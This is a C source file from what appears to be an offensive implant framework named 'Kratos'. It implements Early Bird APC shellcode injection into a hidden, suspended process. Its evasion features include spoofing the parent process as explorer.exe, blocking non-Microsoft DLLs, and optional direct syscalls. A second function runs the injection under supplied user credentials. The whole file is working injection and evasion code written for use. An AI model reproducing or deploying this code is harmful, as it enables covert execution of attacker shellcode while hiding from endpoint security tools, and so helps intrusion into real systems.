#define _WIN32_WINNT 0x0601
#include "inject.h"
#ifdef EVASION_SYSCALLS
#include "evasion.h"
#endif

#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

#if defined(INCLUDE_CMD_SPAWN) || defined(INCLUDE_CMD_SPAWNTO) || defined(INCLUDE_CMD_LIGOLO_START) || defined(INCLUDE_CMD_SPAWNAS) || defined(INCLUDE_CMD_EXECUTE_ASSEMBLY) || defined(INCLUDE_CMD_BLOCKDLLS)

#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
#endif

#ifndef PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x00020007
#endif

#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON 0x100000000000ULL

#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif

char g_spawnto_path[512] = INJECT_DEFAULT_SPAWNTO;
int  g_blockdlls         = 0;

static DWORD find_explorer_pid(void) {
    DWORD  pid   = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    if (Process32First(hSnap, &pe)) do {
        if (_stricmp(pe.szExeFile, "explorer.exe") == 0 && !pid)
            pid = pe.th32ProcessID;
    } while (Process32Next(hSnap, &pe));
    CloseHandle(hSnap);
    return pid;
}

int earlybird_inject(const unsigned char *shellcode, size_t shellcode_len,
                     const char *cmdline_override,
                     int capture_output,
                     EarlyBirdResult *out, char *errmsg, size_t errmsg_len) {
    /* Resolve host process full path */
    wchar_t whost_name[512] = {0};
    MultiByteToWideChar(CP_UTF8, 0, g_spawnto_path, -1, whost_name, 512);
    wchar_t whost_full[512] = {0};
    if (!strchr(g_spawnto_path, '\\') && !strchr(g_spawnto_path, '/')) {
        DWORD ret = SearchPathW(NULL, whost_name, NULL, 512, whost_full, NULL);
        if (ret == 0 || ret >= 512) {
            snprintf(errmsg, errmsg_len, "Error: '%s' not found in PATH", g_spawnto_path);
            return 0;
        }
    } else {
        wcsncpy(whost_full, whost_name, 511);
    }

    /* Temp file for output capture: stdout+stderr merged, no pipe deadlock.
     * Must be created before the attribute list.
     * Note: PPID spoofing (PROC_THREAD_ATTRIBUTE_PARENT_PROCESS) causes the child to
     * inherit handles from the spoofed parent, not from Kratos. PROC_THREAD_ATTRIBUTE_HANDLE_LIST
     * would need handles valid in the parent process's table (not ours), which requires
     * DuplicateHandle into explorer.exe. Skip PPID spoof when capturing output to keep
     * standard bInheritHandles=TRUE inheritance working correctly. */
    HANDLE hCaptureFile = NULL;
    out->output_file[0] = '\0';
    if (capture_output) {
        char tmp_dir[MAX_PATH] = {0};
        GetTempPathA(MAX_PATH, tmp_dir);
        GetTempFileNameA(tmp_dir, "ea_", 0, out->output_file);
        SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
        hCaptureFile = CreateFileA(out->output_file, GENERIC_WRITE, FILE_SHARE_READ,
                                   &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL);
        if (hCaptureFile == INVALID_HANDLE_VALUE) {
            hCaptureFile = NULL;
            out->output_file[0] = '\0';
        }
    }

    /* PPID spoof: explorer.exe - disabled when capture_output is set (handle inheritance conflict) */
    DWORD  spoof_pid = capture_output ? 0 : find_explorer_pid();
    HANDLE hParent   = NULL;
    if (spoof_pid) {
#ifdef EVASION_SYSCALLS
        NTSTATUS _st = kratos_NtOpenProcess(&hParent, PROCESS_CREATE_PROCESS, spoof_pid);
        if (!NT_SUCCESS(_st)) hParent = NULL;
#else
        hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, spoof_pid);
#endif
    }

    /* Attribute list: PPID spoof + BlockDLLs only.
     * No HANDLE_LIST: bInheritHandles=TRUE with SECURITY_ATTRIBUTES.bInheritHandle on hCaptureFile
     * is sufficient. The child's inherited copy of hCaptureFile is closed when the child exits;
     * this does not affect Kratos's handle table (inherited handles are duplicates, not aliases). */
    int     attr_count = (hParent ? 1 : 0) + (g_blockdlls ? 1 : 0);
    BOOL    use_attr   = FALSE;
    LPPROC_THREAD_ATTRIBUTE_LIST attr = NULL;
    DWORD64 mitigation_policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

    if (attr_count > 0) {
        SIZE_T attr_size = 0;
        InitializeProcThreadAttributeList(NULL, attr_count, 0, &attr_size);
        attr = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attr_size);
        if (attr && InitializeProcThreadAttributeList(attr, attr_count, 0, &attr_size)) {
            use_attr = TRUE;
            if (hParent)
                UpdateProcThreadAttribute(attr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                          &hParent, sizeof(hParent), NULL, NULL);
            if (g_blockdlls)
                UpdateProcThreadAttribute(attr, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                                          &mitigation_policy, sizeof(mitigation_policy), NULL, NULL);
        } else {
            if (attr) { HeapFree(GetProcessHeap(), 0, attr); attr = NULL; }
        }
    }

    /* Build lpCommandLine */
    wchar_t wcmdline[2048] = {0};
    if (cmdline_override)
        MultiByteToWideChar(CP_UTF8, 0, cmdline_override, -1, wcmdline, 2048);
    else
        wcsncpy(wcmdline, whost_full, 2047);

    STARTUPINFOEXW siex;
    ZeroMemory(&siex, sizeof(siex));
    siex.StartupInfo.cb          = use_attr ? (DWORD)sizeof(siex) : (DWORD)sizeof(STARTUPINFOW);
    siex.StartupInfo.dwFlags     = STARTF_USESHOWWINDOW;
    siex.StartupInfo.wShowWindow = SW_HIDE;
    if (use_attr) siex.lpAttributeList = attr;
    if (hCaptureFile) {
        siex.StartupInfo.dwFlags   |= STARTF_USESTDHANDLES;
        siex.StartupInfo.hStdOutput = hCaptureFile;
        siex.StartupInfo.hStdError  = hCaptureFile;
        siex.StartupInfo.hStdInput  = NULL;
    }

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    DWORD cflags = CREATE_SUSPENDED | CREATE_NO_WINDOW;
    if (use_attr) cflags |= EXTENDED_STARTUPINFO_PRESENT;

    BOOL ok = CreateProcessW(whost_full, wcmdline, NULL, NULL,
                             hCaptureFile ? TRUE : FALSE,
                             cflags, NULL, NULL, &siex.StartupInfo, &pi);
    if (use_attr) { DeleteProcThreadAttributeList(attr); HeapFree(GetProcessHeap(), 0, attr); }
    if (hParent) CloseHandle(hParent);
    /* Close parent's copy - child inherited it; we read the file after process exit */
    if (hCaptureFile) CloseHandle(hCaptureFile);

    if (!ok) {
        if (out->output_file[0]) DeleteFileA(out->output_file);
        snprintf(errmsg, errmsg_len, "Error: CreateProcess(%s) failed (%lu)",
                 g_spawnto_path, GetLastError());
        return 0;
    }

    /* Alloc RW in remote process */
    LPVOID rmem = NULL;
#ifdef EVASION_SYSCALLS
    PVOID  base = NULL;
    SIZE_T rsz  = shellcode_len;
    NTSTATUS st = kratos_NtAllocateVirtualMemory(pi.hProcess, &base, 0, &rsz,
                                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(st)) {
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: NtAllocateVirtualMemory failed (0x%08lX)", (unsigned long)st);
        return 0;
    }
    rmem = base;
#else
    rmem = VirtualAllocEx(pi.hProcess, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!rmem) {
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: VirtualAllocEx failed (%lu)", GetLastError());
        return 0;
    }
#endif

    /* Write shellcode */
    SIZE_T written = 0;
#ifdef EVASION_SYSCALLS
    st = kratos_NtWriteVirtualMemory(pi.hProcess, rmem, (PVOID)shellcode, shellcode_len, &written);
    if (!NT_SUCCESS(st) || written != shellcode_len) {
        VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: NtWriteVirtualMemory failed");
        return 0;
    }
#else
    if (!WriteProcessMemory(pi.hProcess, rmem, shellcode, shellcode_len, &written)
            || written != shellcode_len) {
        VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: WriteProcessMemory failed");
        return 0;
    }
#endif

    /* Flip RW -> RX */
#ifdef EVASION_SYSCALLS
    PVOID  prot_base = rmem;
    SIZE_T prot_sz   = shellcode_len;
    ULONG  old_prot  = 0;
    kratos_NtProtectVirtualMemory(pi.hProcess, &prot_base, &prot_sz, PAGE_EXECUTE_READ, &old_prot);
#else
    DWORD old_prot = 0;
    VirtualProtectEx(pi.hProcess, rmem, shellcode_len, PAGE_EXECUTE_READ, &old_prot);
#endif

    /* Queue APC - fires inside LdrInitializeThunk (alertable wait, before CFG active) */
#ifdef EVASION_SYSCALLS
    st = kratos_NtQueueApcThread(pi.hThread, rmem, NULL, NULL, NULL);
    if (!NT_SUCCESS(st)) {
        VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: NtQueueApcThread failed (0x%08lX)", (unsigned long)st);
        return 0;
    }
#else
    if (!QueueUserAPC((PAPCFUNC)(ULONG_PTR)rmem, pi.hThread, 0)) {
        VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: QueueUserAPC failed (%lu)", GetLastError());
        return 0;
    }
#endif

    ResumeThread(pi.hThread);

    out->hProcess = pi.hProcess;
    out->hThread  = pi.hThread;
    out->pid      = pi.dwProcessId;
    return 1;
}

#ifdef INCLUDE_CMD_SPAWNAS

int earlybird_inject_asuser(const unsigned char *shellcode, size_t shellcode_len,
                             const char *username, const char *domain, const char *password,
                             EarlyBirdResult *out, char *errmsg, size_t errmsg_len) {
    /* Resolve host process full path */
    wchar_t whost_name[512] = {0};
    MultiByteToWideChar(CP_UTF8, 0, g_spawnto_path, -1, whost_name, 512);
    wchar_t whost_full[512] = {0};
    if (!strchr(g_spawnto_path, '\\') && !strchr(g_spawnto_path, '/')) {
        DWORD ret = SearchPathW(NULL, whost_name, NULL, 512, whost_full, NULL);
        if (ret == 0 || ret >= 512) {
            snprintf(errmsg, errmsg_len, "Error: '%s' not found in PATH", g_spawnto_path);
            return 0;
        }
    } else {
        wcsncpy(whost_full, whost_name, 511);
    }

    wchar_t wuser[256]   = {0};
    wchar_t wdomain[256] = {0};
    wchar_t wpass[256]   = {0};
    MultiByteToWideChar(CP_UTF8, 0, username, -1, wuser, 256);
    MultiByteToWideChar(CP_UTF8, 0, (domain && domain[0]) ? domain : ".", -1, wdomain, 256);
    MultiByteToWideChar(CP_UTF8, 0, password, -1, wpass, 256);

    wchar_t wcmdline[2048] = {0};
    wcsncpy(wcmdline, whost_full, 2047);

    STARTUPINFOW si;
    ZeroMemory(&si, sizeof(si));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    BOOL ok = CreateProcessWithLogonW(
        wuser, wdomain, wpass,
        LOGON_WITH_PROFILE,
        whost_full, wcmdline,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL, NULL,
        &si, &pi
    );
    if (!ok) {
        snprintf(errmsg, errmsg_len, "Error: CreateProcessWithLogonW(%s\\%s) failed (%lu)",
                 domain && domain[0] ? domain : ".", username, GetLastError());
        return 0;
    }

    /* Alloc RW in remote process */
    LPVOID rmem = NULL;
#ifdef EVASION_SYSCALLS
    PVOID  base = NULL;
    SIZE_T rsz  = shellcode_len;
    NTSTATUS st = kratos_NtAllocateVirtualMemory(pi.hProcess, &base, 0, &rsz,
                                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(st)) {
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: NtAllocateVirtualMemory failed (0x%08lX)", (unsigned long)st);
        return 0;
    }
    rmem = base;
#else
    rmem = VirtualAllocEx(pi.hProcess, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!rmem) {
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: VirtualAllocEx failed (%lu)", GetLastError());
        return 0;
    }
#endif

    /* Write shellcode */
    SIZE_T written = 0;
#ifdef EVASION_SYSCALLS
    st = kratos_NtWriteVirtualMemory(pi.hProcess, rmem, (PVOID)shellcode, shellcode_len, &written);
    if (!NT_SUCCESS(st) || written != shellcode_len) {
        VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: NtWriteVirtualMemory failed");
        return 0;
    }
#else
    if (!WriteProcessMemory(pi.hProcess, rmem, shellcode, shellcode_len, &written)
            || written != shellcode_len) {
        VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: WriteProcessMemory failed");
        return 0;
    }
#endif

    /* Flip RW -> RX */
#ifdef EVASION_SYSCALLS
    PVOID  prot_base = rmem;
    SIZE_T prot_sz   = shellcode_len;
    ULONG  old_prot  = 0;
    kratos_NtProtectVirtualMemory(pi.hProcess, &prot_base, &prot_sz, PAGE_EXECUTE_READ, &old_prot);
#else
    DWORD old_prot = 0;
    VirtualProtectEx(pi.hProcess, rmem, shellcode_len, PAGE_EXECUTE_READ, &old_prot);
#endif

    /* Queue APC */
#ifdef EVASION_SYSCALLS
    st = kratos_NtQueueApcThread(pi.hThread, rmem, NULL, NULL, NULL);
    if (!NT_SUCCESS(st)) {
        VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: NtQueueApcThread failed (0x%08lX)", (unsigned long)st);
        return 0;
    }
#else
    if (!QueueUserAPC((PAPCFUNC)(ULONG_PTR)rmem, pi.hThread, 0)) {
        VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: QueueUserAPC failed (%lu)", GetLastError());
        return 0;
    }
#endif

    ResumeThread(pi.hThread);

    out->hProcess = pi.hProcess;
    out->hThread  = pi.hThread;
    out->pid      = pi.dwProcessId;
    return 1;
}

#endif /* INCLUDE_CMD_SPAWNAS */

#endif /* INCLUDE_CMD_SPAWN || INCLUDE_CMD_SPAWNTO || INCLUDE_CMD_LIGOLO_START || INCLUDE_CMD_SPAWNAS */
